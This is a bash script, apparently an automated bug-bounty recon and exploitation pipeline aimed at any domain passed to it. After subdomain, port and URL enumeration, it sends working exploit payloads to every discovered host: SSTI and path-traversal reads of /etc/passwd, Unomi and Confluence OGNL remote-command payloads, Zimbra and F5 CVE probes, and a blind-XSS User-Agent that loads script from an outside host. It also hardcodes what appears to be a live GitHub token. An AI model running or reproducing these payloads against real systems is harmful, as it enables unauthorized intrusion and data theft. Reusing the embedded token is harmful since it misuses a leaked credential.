#!/bin/bash

domain=$1
# grep ip-address - grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" 
# grep subdomains relate your target - grep -Po '^[^-*"]*?\K[[:alnum:]-]+\.egoiapp\.com$'
# filter http,https from file - sed 's/https\?:\/\///'

#----------------------------------------
#	Subdomain Enumeration				|
#----------------------------------------
mkdir $domain/
cd $domain
mkdir subdomain 
cd subdomain
subfinder -d $1 -silent -all -o subfinder.txt
findomain-linux -o -t $1 
assetfinder -subs-only $1 | tee assetfinder.txt
sublist3r -d $1 -o sublister.txt
amass enum -passive -norecursive -noalts -d $1 -o amass.txt
python3 ~/ReconTool/censys-subdomain-finder/censys-subdomain-finder.py $1 -o censys-subdomain.txt
github-subdomains -d $1 -t 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 -o github-domain.txt
curl -sk "https://crt.sh/?q=$1&output=json" | tr ',' '\n' | awk -F '"' '/common_name/{gsub(/|*\./,"",$4);gsub(/\\n/,"\n",$4);print $4}' | sort -u | tee crt-sh.txt
python3 /root/ReconTool/knock/knockpy.py $1 --no-http-code 404 500 530 403 401
cat knockpy_report/*.json | grep -Po '^[^-*"]*?\K[[:alnum:]-]+\.$1\.com$' | tee knock-subdomains.txt
cat *.txt | sort -u | tee subdomains.txt
cat subdomains.txt | httpx -silent -o hosts.txt

#dnsrecon Zone Transfer
mkdir DNS-Enum
cd DNS-Enum
dnsrecon -a -d $1 -x $domain.xml
mv /usr/share/dnsrecon/$domain.xml .
fierce --domain $1 | tee fierce.txt 
dnsenum $1 -o dnsenum.txt

cd ..
cat subdomains.txt | httpx -silent | aquatone -ports 80 443 8000 8080 8443
gospider -S hosts.txt --js -t 20 -d 2 --sitemap --robots -w -r > some-useful-urls.txt
cat some-useful-urls.txt | sed '/^.\{2048\}./d' | grep -Eo 'https?://[^ ]+' | sed 's/]$//' | unfurl -u domains | grep ".$1" | tee other-subdomains.txt

# Test:Subdomain-Takeover
cat hosts.txt | nuclei -t ~/FindBug/subdomain-takeover.yaml -o subdomain-takeover.out 
subzy -targets hosts.txt --hide_fails --concurrency 100 | tee subdomain-takeover2.txt 

# cd ..
sleep 5
echo "[+] Done Subdomain Enumeration"
#---------------------------------------
#	Gather domain-IPs   				|
#---------------------------------------
mkdir IPs
subfinder -d $1 -all -silent | dnsx -a -resp-only -o IPs/IP-A-Record.txt
cat subdomain/hosts.txt | dnsx -a -resp-only -o IPs/live-ip.txt
cat subdomain/knockpy_report/*.json | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" | tee knock-ips.txt
censys search $1 | grep "ip" | egrep -v "description" | cut -d ":" -f2 | tr -d \"\ | sed 's/,//g' tee IPs/censys-ip.txt
cat IPs/*.txt | sort -u | uro | tee IPs/ips.txt
cat subdomain/subdomains.txt | dnsx -a -resp-only | nrich - | tee IPs/nrich.out  
naabu -l subdomain/subdomains.txt -rate 3000 -retries 1 -warm-up-time 0 -c 50 -top-ports 1000 -silent -o IPs/subdomain-port.txt
traceroute $1 | anew IPs/trace-ips.txt
shodan search Ssl.cert.subject.CN:"$1" 200 --fields ip_str | httpx -silent | tee IPs/shodan-ip.txt
cat subdomain/subdomains.txt | assetfinder -subs-only | naabu -sa -silent -nc -tp 80 -p 8080 8443 8090 9000 9001 9002 9003 | aquatone -out aquatone_screenshots
masscan -p1–65535 -iL IPs/ips.txt --max-rate 10000 -oG IPs/masscan.txt
nmap --script default,safe,discovery -p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8880,3000 -n -T4 -iL IPs/ips.txt -oN nmap.out 
curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | cut -d '/' -f3  | sed 's/?t=cname//g' | sed 's/#result//g' | sed 's/\.$//' | sort -u | tee Rapid-Dns.txt

sleep 5
echo "[+] Done IPs Enumeration"
#-----------------------------------------------
#  Gathering Wayback URLs + GauPlus 			|
#------------------------------------------------
mkdir URLs
cat subdomain/hosts.txt | waybackurls | sort -u | uro | httpx -silent | tee URLs/waybackurls.txt
cat subdomain/hosts.txt | gauplus | sort -u | uro | httpx -silent | tee URLs/Gauplus.txt
python3 ~/ReconTool/waybackMachine/waybackMachine.py $1 | sort -u | uro | tee URLs/WaybaclMachine.txt
cat URLs/*.txt | sort -u | uro | tee URLs/urls.txt

python3 ~/ReconTool/ParamSpider/paramspider.py -d $1 --exclude woff,.css,.js,.png,.svg,.php,.jpg
cat URLs/urls.txt | cut -d "/" -f 4,5 | sed 's/?.*//' | sort -u | tee wordlist.txt

echo "[+] Done Crawlling: Wayback + Gauplus + ParamSpider "
#-------------------------------------------------
#	 				GF-Pattern					 |
#-------------------------------------------------
mkdir GF-Pattern
cat URLs/urls.txt | grep "=http" | sort -u | tee GF-Pattern/redirect.txt
cat URLs/urls.txt | gf xss | sort -u | tee GF-Pattern/xss.txt 
cat URLs/urls.txt | gf sqli | sort -u | tee GF-Pattern/sqli.txt
cat URLs/urls.txt | gf ssrf | sort -u | tee GF-Pattern/ssrf.txt
cat URLs/urls.txt | gf lfi | sort -u | tee GF-Pattern/lfi.txt
cat URLs/urls.txt | gf idor | sort -u | tee GF-Pattern/idor.txt
cat URLs/urls.txt | gf rce | sort -u | tee GF-Pattern/rce.txt
cat URLs/urls.txt | gf ssti | sort -u | tee GF-Pattern/ssti.txt
cat GF-Pattern/ssti.txt |  qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x" | tee ssti-result.txt

sleep 5
echo "[+] Done GF-Pattern "
#----------------------------------------------------
# 				Gather-JS File 						|							
#----------------------------------------------------
mkdir JS-FILE
cd JS-FILE
echo $1 | gauplus | grep '\.js$' | httpx -status-code -mc 200 -silent | grep 'application/javascript' | tee jsfile1.txt
assetfinder $1 | gau|egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | grep ".*\.js" | tee jsfile2.txt
subfinder -d $1 -silent | waybackurls | grep ".js$" | tee jsfile3.txt
subfinder -d $1 -silent | httpx -silent | subjs | tee jsfile4.txt
#Noted: Spider the host on burp and copy all the js file link from burp also so that you won’t miss any js file and paste it into jsfile.txt file
cat *.txt | sort -u | tee final-js.txt
cat final-js.txt | xargs -I% bash -c 'curl -sk "%" | grep -w "*.s3.amazonaws.com"' | tee s3_bucket.txt
cat final-js.txt| xargs -I% bash -c 'curl -sk "%" | grep -w "*.s3.us-east-2.amazonaws.com"' | tee s3_bucket.txt
cat final-js.txt | xargs -I% bash -c 'curl -sk "%" | grep -w "s3.amazonaws.com/*"' | tee s3_bucket.txt
cat final-js.txt |  xargs -I% bash -c 'curl -sk "%" | grep -w "s3.us-east-2.amazonaws.com/*"' | tee s3_bucket.txt 
#we have all the s3 aws bucket url then we will collect the s3 buck name
cat s3_bucket.txt | sed 's/s3.amazonaws.com//' >> bucket_name.txt
cat s3_bucket.txt | sed 's/s3.us-east-2.amazonaws.com//' >> bucket_name.txt
# https://medium.com/@notifybugme/how-i-was-able-find-mass-leaked-aws-s3-bucket-from-js-file-6064a5c247f8 --> For further read 
cd ..

sleep 5
echo "[+] Done JS File Enumeration"
#-----------------------------------------------
#		Technology - Tech Detech 				|
#-----------------------------------------------
mkdir Technologies
httpx -l subdomain/hosts.txt -threads 100 -match-string 'Moment.js' -o Technologies/Moment.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'wordpress' -o Technologies/wordpress.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'Elementor' -o Technologies/Elementor.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'grafana' -o Technologies/grafana.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'confluence' -o Technologies/confluence.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'jira' -o Technologies/jira.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'zimbra' -o Technologies/zimbra.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'VMware' -o Technologies/VMware.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'Elasticsearch' -o Technologies/Elasticsearch.txt
httpx -l subdomain/hosts.txt -threads 100 -match-string 'springcloud' -o Technologies/springcloud.txt

sleep 5
echo "[+] Done Technologies Detect"
#------------------------------------------------
# 				Nuclie Scan						| 
#------------------------------------------------
mkdir Nuclie
nuclei -l subdomain/hosts.txt -tags lfi,xss,ssrf,wordpress,rce,cve -c 500 --bulk-size 500 -t ~/nuclei-templates/ -o Nuclie/nuclei-scan.txt
# cat subdomain/hosts.txt | nuclei -t ~/nuclei-templates -severity critical,high,medium,low -c 500 --bulk-size 500 -o Nuclie/nuclei.out
nuclei -l subdomain/hosts.txt -t ~/FindBug/TP5_Arbitrary_file_read.yaml -o Nuclie/arbitary-fileread.out
# cat subdomain/hosts.txt | assetfinder -subs-only | httpx -silent -p 80 443 8080 8443 9000 9001 9002 9003 -nc  | nuclei -t ~/nuclei-templates/ --severity critical high medium low -silent -o Nuclie/nuclei.txt
rustscan -a IPs/ips.txt -r 1-65535 | grep Open | tee Nuclie/open-ports.txt | sed 's/Open//g' | httpx -silent | nuclei -t ~/nuclei-templates -o Nuclie/rustscan-result.out
nuclei -l subdomain/hosts.txt -t ~/FindBug/Host-header-injection.yaml -o host-header.out 
nuclei -l subdomain/hosts.txt -t ~/FindBug/CVE-2022-30525-initial-detect.yaml -o Zyxel-RCE.out 
nuclei -l subdomain/hosts.txt -t ~/FindBug/web-cache.yaml -o webcache.out 
nuclei -l subdomain/hosts.txt -t ~/FindBug/User-Agent-XSS.yaml
nuclei -l Technologies/wordpress.txt -tags wordpress ~/nuclei-templates -o Nuclie/wordpress.out 
nuclei -l subdomain/hosts.txt -t ~/FindBug/graphql-OFJAAAH.yaml -o Nuclie/grapql.out 
nuclei -l subdomain/hosts.txt -id CVE-2022-31474 -t ~/nuclei-templates -o WP-BackupBuddy.out # For-wordpress BackupBuddy Plugin-LFI

sleep 5
echo "[+] Done Nuclie Scan "

#------------------------------------------------
#		Vulnerability Scan 						|
#================================================
# LFI: Scan |
# -----------
mkdir Vulnerability
cat GF-Pattern/lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c "%" 2>&1 | grep -q "root" && echo "Vulnerable to LFI" | tee Vulnerability/lfi.txt
nuclei -l subdomain/hosts.txt -t ~/nuclei-templates/cves/2019/CVE-2019-5418.yaml -o Vulnerability/Rail-lfi.txt

# XSS
cat URLs/urls.txt | httpx -mc 200 -H "User-Agent: \"><script src=https://abdulrahman2x.xss.ht></script>" -o blind-xss-fuzz.txt

#-------------------------------------------------
#		Other Scan 								 |
#-------------------------------------------------
crlfuzz -l subdomain/hosts.txt -o crlf.txt
cat subdomain/hosts.txt | httpx -path "/cgi-bin/admin.cgi?Command=sysCommand&Cmd=id" -nc -ports 80 443 8080 8443 -mr "uid=" -silent -o Vulnerability/os-injection.out
httpx subdomain/hosts.txt -path "/_fragment?_path=_controller=phpcredits&flag=-1" -threads 100 -random-agent -x GET  -tech-detect -status-code  -follow-redirects -title -mc 200 -match-regex "PHP Credits" -o Vulnerability/RCE.out
cat subdomain/hosts.txt | httpx -nc -t 300 -p 80,443,8080,8443 -silent -path "/s/123cfx/_/;/WEB-INF/classes/seraph-config.xml" -mc 200 -o Vulnerability/attlassian.txt
cat subdomain/hosts.txt | httpx -path "s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties" -mc 200 -o Jira-CVE-2021-26086.txt
cat IPs/shodan-ip.txt | httpx -path "s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties" -mc 200 -o Jira-CVE-2021-26086-2.txt
cat subdomain/hosts.txt | httpx -title -path "/wp-admin/admin-post.php?page=pb_backupbuddy_destinations&local-destination-id=/etc/passwd&local-download=/etc/passwd" -match-string "root:x:0:0" -o Vulnerability/CVE-2022-31474.txt
cat subdomain/hosts.txt | httpx -c -silent -path "/wp-content/mysql.sql" -mc 200 -t 250 -p 80,443,8080,8443  | anew Vulnerability/myP1s.txt
nuclei -l subdomain/hosts.txt -tags aem -t ~/nuclei-templates -vv -o aem.out 
# Unomi-RCE
cat subdomain/hosts.txt | while read host do;do  curl --insecure --silent -X POST http://$host/context.json --header 'Content-type: application/json' --data '{"filters":[{"id":"boom ","filters":[{"condition":{"parameterValues":{"propertyName":"prop","comparisonOperator":"equals","propertyValue":"script::Runtime r=Runtime.getRuntime();r.exec('id');"},"type":"profilePropertyCondition"}}]}],"sessionId":"boom"}' | grep -qs "boom" && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done | egrep -v "Not" | tee Vulnerability/Unomi-RCE.txt 
cat subdomain/hosts.txt | httpx -path "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/" -mc 302 -o Vulnerability/ONGL-injection.txt #https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2022-26134
cat subdomain/hosts.txt | httpx -follow-redirects -title -path "/repos?visibility=public" -match-string "repository-container" -threads 9500 -o Vulnerability/CVE-2022-36804.txt # @shaybt12
# cat subdomain/hosts.txt | httpx -path "/${#this.getUserAccessor().addUser('abdulx01','password@123','abdul@rahman.com','Abdul',@com.attlassian.confluence.util.GeneralUnit@splitCommaDelimitedString("confluence-administrators,confluence-users"))}/" -mc 302 -o Vulnerability/ONGL-injection2.txt
cat subdomain/hosts.txt | httpx -nc -silent -t 80 -p 80,443,8443,8080,8088,8888,9000,9001,9002,9003 -path "/app_dev.php/1'%20%22" -mr "An exception occurred" -o Vulnerability/symfony-sqli-error.txt
cat subdomain/hosts.txt | httpx -ports 80,443,8080,8443,8090 -path /web-console/ -status-code -title -nc -t 250 -mc 200 -o Vulnerability/webconsole.txt
cat subdomain/hosts.txt |  httpx -nc -t 300 -p 80,443,8080,8443,8888,8088 -path "/jobmanager/logs/..%252f..%252f..%252f......%252f..%252fetc%252fpasswd"  -mr "root:x" -silent -o Vulnerability/Apache-Flink-lfi.txt
cat subdomain/hosts.txt | httpx -nc -silent -p 80,443,8080,8443,8088,9000,9001,9002,9003 -path "/../../../../../../../../etc/random/../password" -mr "root:x" | tee Vulnerability/lfi3.txt
cat subdomain/hosts.txt | httpx -t 60 -nc -p 80,443,8080,8443,9001,9002,9002,9003 -H "Cookie:usid=../../../../../../../../../../../../etc/passwd" -mc 200 -mr "root:x:" -o Vulnerability/lfi-on-cookie.txt
cat subdomain/hosts.txt | httpx -p 80,443,8080,8443,9001,9002,9003,9000 -path "/asset////////////////../../../../../../../../etc/passwd" -mr "root:x" -nc -t 50 -o Vulnerability/LFI.txt
cat subdomain/hosts.txt | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8888,8088,8808 -path "/logs/downloadMainLog?fname=../../../../../../..//etc/passwd" -mr "root:x:" -t 60 | tee Vulnerability/lfi2.txt
cat subdomain/hosts.txt | httpx -path "/zimbraAdmin/cmd.jsp?cmd=ls" -match-string "Command: ls" -o Vulnerability/Zimbra-CVE-2022-27925.txt
cat subdomain/hosts.txt | httpx -title -path "/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/" -match-string "gid=" -o Vulnerability/CVE-2022-26134.txt #shayb112
cat subdomain/hosts.txt | httpx  -follow-redirects -title -path "/secure/WBSGanttManageScheduleJobAction.jspa" -match-string "WBS Gantt-Chart" -threads 9500 -o Vulnerability/Attlassian-CVE-2022-0540.txt 
cat IPs/shodan-ip.txt | httpx -match-string "resterrorresponse" -threads 9500 -paths "/mgmt/shared/authn/login" -follow-redirects -o Vulnerability/CVE-2022-1388.txt 
cat subdomain/hosts.txt | httpx -follow-redirects -title -path "/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=file:///etc/passwd" -match-string "root:x:0:0" -o Vulnerability/VMware-vCenter.txt #@shaybt12
cat subdomain/hosts.txt | httpx -follow-redirects -title -path "/api/geojson?url=file:///etc/passwd" -match-string "root:x:0:0" -o Vulnerability/CVE-2021-41277.txt
cat Nuclie/open-ports.txt | httpx -follow-redirects -title -path "/api/geojson?url=file:///etc/passwd" -match-string "root:x:0:0" -o Vulnerability/CVE-2021-41277.txt
cat IPs/shodan-ip.txt | httpx -follow-redirects -title -path "/api/geojson?url=file:///etc/passwd" -match-string "root:x:0:0" -o Vulnerability/CVE-2021-41277.txt

#CVE-2020-5902
cat subdomain/hosts.txt | while read h do ;do curl -s --path-as-is -k "https://$h/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$h \033[0;31mVuln\n" || printf "$h \033[0;32mNot Vuln\n";done | egrep -v 'Not' | tee CVE-2020-5902.txt
python3 ~/ReconTool/SQLiDetector/sqlidetector.py -f GF-Pattern/sqli.txt -w 50 -o sqli-ouput.txt
cat GF-Pattern/sqli.txt | sed 's/=.*/=/' | nuclei -t ~/FindBug/sqli.yaml -o sqli-detect.out

sleep 5
echo "[+] Done Recon :) Happy Hacking"

